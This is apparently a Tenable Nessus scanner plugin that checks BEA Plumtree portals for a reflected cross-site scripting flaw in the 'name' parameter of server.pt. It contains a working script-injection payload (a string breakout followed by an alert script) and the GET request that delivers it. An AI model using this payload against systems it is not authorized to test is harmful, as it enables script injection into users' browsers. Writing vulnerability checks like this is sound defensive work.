#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(31120);
  script_version("$Revision: 1.13 $");
  script_bugtraq_id(27893);
  script_osvdb_id(41882);

  script_name(english:"BEA Plumtree portal/server.pt name Parameter XSS");
  script_summary(english:"Tries to inject script code into ");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application affected by a cross-site
scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of the Plumtree portal included with BEA AquaLogic
Interaction / Plumtree Foundation and installed on the remote host
fails to sanitize user-supplied input to the 'name' parameter of the
'portal/server.pt' script before using it to generate dynamic HTML
output.  An unauthenticated attacker can exploit this to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site." );
  # http://web.archive.org/web/20080511153436/http://www.procheckup.com/Vulnerability_PR06-12.php
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?713eaf97" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488346" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/296" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch as suggested in the vendor advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/20");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:bea_systems:plumtree_collaboration");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);


exploit = string('";}</script>', "<script>alert('", SCRIPT_NAME, "')</script>");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/portal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Inject some script code.
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/server.pt?",
      "open=space&",
      "name=", urlencode(str:exploit)
    ),
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our exploit in the results.
  if (
    "function OpenerAS_GetParentSpaceName()" >< res &&
    string('return "', exploit, '";') >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
